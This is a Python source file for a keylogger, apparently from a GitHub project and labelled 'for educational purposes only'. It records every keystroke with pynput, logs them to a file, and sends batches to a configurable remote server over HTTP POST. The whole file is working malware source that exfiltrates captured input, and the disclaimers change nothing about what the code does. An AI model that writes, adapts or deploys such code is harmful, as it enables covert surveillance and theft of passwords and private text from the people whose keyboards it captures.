"""
Keylogger Module
Captures keyboard input and sends it to a remote server.
For educational purposes only.
"""

import logging
import os
import sys
import json
import argparse
from pynput.keyboard import Listener, Key
import requests
import time

# ASCII Art Banner
BANNER = r"""
              _  __            _                                
             | |/ /___ _   _  | |    ___   __ _  __ _  ___ _ __ 
             | ' // _ \ | | | | |   / _ \ / _` |/ _` |/ _ \ '__|
             | . \  __/ |_| | | |__| (_) | (_| | (_| |  __/ |   
             |_|\_\___|\__, | |_____\___/ \__, |\__, |\___|_|   
                       |___/              |___/ |___/           
                                                         0.2  



GitHub: https://github.com/Stalin-143
"""


class KeyLogger:
    """Keylogger class to handle keyboard input capture and logging."""

    def __init__(self, log_file_path, server_url, batch_size=10):
        """
        Initialize the KeyLogger.

        Args:
            log_file_path (str): Path to the log file
            server_url (str): URL of the server to send logs to
            batch_size (int): Number of keystrokes before sending to server
        """
        self.log_file_path = log_file_path
        self.server_url = server_url
        self.batch_size = batch_size
        self.buffer = []

        # Ensure the log directory exists
        log_dir = os.path.dirname(self.log_file_path)
        if log_dir and not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except PermissionError as e:
                print(f"PermissionError: {e}")
                print("Please ensure you have permission to write to the specified path.")
                sys.exit(1)

        # Configure logging
        logging.basicConfig(
            filename=self.log_file_path,
            level=logging.DEBUG,
            format="%(asctime)s: %(message)s"
        )

    def send_log_to_server(self):
        """Send buffered log data to the web server."""
        if not self.buffer:
            return

        try:
            log_data = ''.join(self.buffer)
            response = requests.post(self.server_url, data={"log": log_data}, timeout=10)

            if response.status_code == 200:
                print("Log sent successfully!")
            else:
                print(f"Failed to send log. Server responded with status: {response.status_code}")

            # Clear the buffer after sending
            self.buffer = []

        except requests.exceptions.RequestException as e:
            print(f"Error sending log: {e}")

    def on_press(self, key):
        """
        Handle key press events.

        Args:
            key: The key that was pressed
        """
        try:
            # Capture the key press and format it
            if hasattr(key, 'char') and key.char is not None:
                key_str = f"Key pressed: {key.char}"
            else:
                # Handle special keys
                key_str = f"Special key pressed: {key}"

            # Log the key
            logging.info(key_str)
            self.buffer.append(key_str + "\n")

            # If buffer reaches batch size, send the log
            if len(self.buffer) >= self.batch_size:
                self.send_log_to_server()

        except Exception as e:
            print(f"Error logging key: {e}")

    def on_release(self, key):
        """
        Handle key release events.

        Args:
            key: The key that was released

        Returns:
            False to stop the listener when ESC is pressed
        """
        # Stop listener when 'esc' is pressed
        if key == Key.esc:
            return False

    def start(self):
        """Start the keylogger."""
        print(BANNER)
        print("Keylogger started. Press ESC to stop.")
        print(f"Logging to: {self.log_file_path}")
        print(f"Server URL: {self.server_url}")
        print("-" * 50)

        # Start listening for keyboard events
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

        # Send any remaining logs when the listener stops
        self.send_log_to_server()
        print("\nKeylogger stopped.")


def load_config(config_path):
    """
    Load configuration from JSON file.

    Args:
        config_path (str): Path to the config file

    Returns:
        dict: Configuration dictionary
    """
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"Error: Config file not found at {config_path}")
        print("Please copy config/config.json.example to config/config.json and configure it.")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"Error: Invalid JSON in config file: {e}")
        sys.exit(1)


def main():
    """Main function to run the keylogger."""
    parser = argparse.ArgumentParser(
        description='Keylogger - For educational purposes only',
        epilog='Always obtain explicit consent before using monitoring tools.'
    )
    parser.add_argument(
        '--config',
        default='config/config.json',
        help='Path to configuration file (default: config/config.json)'
    )
    parser.add_argument(
        '--log-file',
        help='Override log file path from config'
    )
    parser.add_argument(
        '--server-url',
        help='Override server URL from config'
    )
    parser.add_argument(
        '--batch-size',
        type=int,
        help='Override batch size from config'
    )

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)
    keylogger_config = config.get('keylogger', {})

    # Override with command-line arguments if provided
    log_file_path = args.log_file or keylogger_config.get('log_file_path', 'logs/keylog.txt')
    server_url = args.server_url or keylogger_config.get('server_url', '')
    batch_size = args.batch_size or keylogger_config.get('batch_size', 10)

    if not server_url:
        print("Error: Server URL not configured.")
        print("Please set server_url in config/config.json or use --server-url argument.")
        sys.exit(1)

    # Create and start the keylogger
    keylogger = KeyLogger(log_file_path, server_url, batch_size)
    keylogger.start()


if __name__ == '__main__':
    main()
